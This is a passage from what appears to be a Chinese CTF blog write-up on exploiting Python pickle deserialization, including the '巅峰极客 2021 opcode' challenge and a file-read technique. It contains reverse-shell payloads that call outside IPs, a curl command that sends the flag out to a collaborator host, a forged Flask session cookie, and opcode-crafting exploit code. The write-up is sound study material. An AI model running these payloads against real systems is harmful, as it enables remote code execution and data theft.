&lt;span style="color:#d88200">&amp;#34;python&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;-c&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;import sys,socket,os,pty;s=socket.socket();s.connect((&amp;#34;8.8.8.8&amp;#34;, 13337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&amp;#34;/bin/sh&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">])&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子8 - [巅峰极客 2021]opcode
&lt;/h4>
&lt;/summary>
&lt;p>首页是登录框，任意值均可登入 明面上没什么东西 抓包后看到post传入参数有三个 username, password, imagePath，这里的imagePath也可进行任意文件读取，看一下后端源码&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024145247073.png" alt="image-20211024145247073">&lt;/p>
&lt;p>第一眼看过去是p牛的题和另一个题的杂交了，限制builtins并且不能有R操作码，入口处在44行的&lt;code>session['data']&lt;/code>处&lt;/p>
&lt;p>但是我没仔细注意的地方是17行，跟p牛的那个题一对比就能看出来这样的写法&lt;u>因为是单独的def而不是在对PickleSerializer进行修改，完全做不到重写&lt;code>pickle.loads&lt;/code>方法，只是个摆设&lt;/u>，相当于仅对R操作码进行了限制，笑嘻了&lt;/p>
&lt;p>直接上&lt;code>eval()&lt;/code>+&lt;code>b'o'&lt;/code>来弹shell了，不多bb&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">eval&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/101.35.113.107/8426 0&amp;amp;1&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&lt;/span>
&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者是用&lt;code>system()&lt;/code>+&lt;code>curl&lt;/code>+&lt;code>b'o'&lt;/code>外带flag&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cos&lt;/span>
&lt;span style="color:#111">system&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl burp_collaborator.net/?flag=`app/readflag`&amp;#39;&lt;/span>
&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后生成b64的内容（用&lt;code>'''&lt;/code>的好处是不用考虑太多引号转义的问题&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;xxxxxxxxxxxxxx&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>cookie的生成就是flask_session_cookie_manager一把梭了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python3 flask_session_cookie_manager3.py encode -s &lt;span style="color:#d88200">&amp;#39;y0u-wi11_neuer_kn0vv-!@#se%32&amp;#39;&lt;/span> -t &lt;span style="color:#d88200">&amp;#39;{&amp;#34;data&amp;#34;: &amp;#34;xxxxb64_contentxxxx&amp;#34;, &amp;#34;username&amp;#34;: &amp;#34;adminadmin&amp;#34;}&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>————如果按照题目原有的意思，限制&lt;code>builtins&lt;/code>+&lt;code>b'R'&lt;/code>操作码也是很好做出来的&lt;/p>
&lt;p>先用pker生成带R的opcode&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">getattr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;getattr&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dict&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;dict&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dict_get&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">globals&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;globals&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">builtins&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">__builtins__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict_get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">builtins&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__builtins__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;span style="color:#75715e"># b&amp;#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\&amp;#39;get\&amp;#39;\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\&amp;#39;__builtins__\&amp;#39;\ntRp5\n0g0\n(g5\nS\&amp;#39;eval\&amp;#39;\ntRp6\n0g6\n(S\&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)\&amp;#39;\ntR.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后手搓，在调用callable前添加MARK即&lt;code>(&lt;/code>，去掉&lt;code>t&lt;/code>和调用&lt;code>t&lt;/code>用到的MARK&lt;/p>
&lt;p>也就是&lt;code>[callable] [tuple] R===&amp;gt;MARK [callable] [args...] o&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>b'''cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0(g0\ng1\nS'get'\nop2\n0cbuiltins\nglobals\np3\n0(g3\nop4\n0(g2\ng4\nS'__builtins__'\nop5\n0(g0\ng5\nS'eval'\nop6\n0(g6\nS'__import__(&amp;quot;os&amp;quot;).system(&amp;quot;whoami&amp;quot;)'\no.'''
&lt;/code>&lt;/pre>&lt;p>可以看下区别&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024165337816.png" alt="image-20211024165337816">&lt;/p>
&lt;p>修改都是一对一对的，&lt;strong>总结一下方法就是&lt;code>0gx&lt;/code>要变为&lt;code>0(gx&lt;/code>，&lt;code>(gx&lt;/code>要变为&lt;code>gx&lt;/code> ，&lt;code>tR&lt;/code>换成&lt;code>o&lt;/code>&lt;/strong>&lt;/p>
&lt;p>参考：&lt;a href="https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#toc-heading-6">wp&lt;/a>&lt;/p>
&lt;/details>
&lt;h3 id="--使用_getattributeload_objload_inst实现任意文件读取">&amp;ndash;&amp;raquo;使用&lt;code>_getattribute()&lt;/code>&amp;amp;&lt;code>load_obj()&lt;/code>&amp;amp;&lt;code>load_inst()&lt;/code>实现任意文件读取&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>find_class()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#75715e"># Subclasses may override this.&lt;/span>
&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">audit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pickle.find_class&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">proto&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fix_imports&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">NAME_MAPPING&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">NAME_MAPPING&lt;/span>&lt;span style="color:#111">[(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)]&lt;/span>
&lt;span style="color:#00a8c8">elif&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">IMPORT_MAPPING&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">IMPORT_MAPPING&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">__import__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">level&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">proto&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">_getattribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>_getattribute()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_getattribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">subpath&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">subpath&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;locals&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">AttributeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Can&amp;#39;t get local attribute &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200"> on &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">parent&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>
&lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">subpath&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">AttributeError&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">AttributeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Can&amp;#39;t get attribute &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200"> on &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">None&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">parent&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>read()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>仍然以上面webtmp(究极缝合怪)的题为例，我们可以利用上面的函数，创建一个Animal的实例，然后将name或category的值设置为read wrapper的返回值&lt;/p>
&lt;p>exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">struct&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;(&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;X&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">struct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pack&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;I&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">)))&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload_suffix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;i__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">read&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_suffix&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;R&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Payload:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># b&amp;#39;(X\x04\x00\x00\x00flagi__main__\nread\n.&amp;#39;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Length:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Base64:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811193545692.png" alt="image-20210811193545692">&lt;/p>
&lt;p>再把这一部分的payload缝合到创建Animal实例的Opcode中去&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 原: name=&amp;#39;x&amp;#39;,category=&amp;#39;y&amp;#39;&lt;/span>
&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">c__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Animal&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x04\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">nameq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">xq&lt;/span>&lt;span style="color:#8045ff">\x04&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x08\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">categoryq&lt;/span>&lt;span 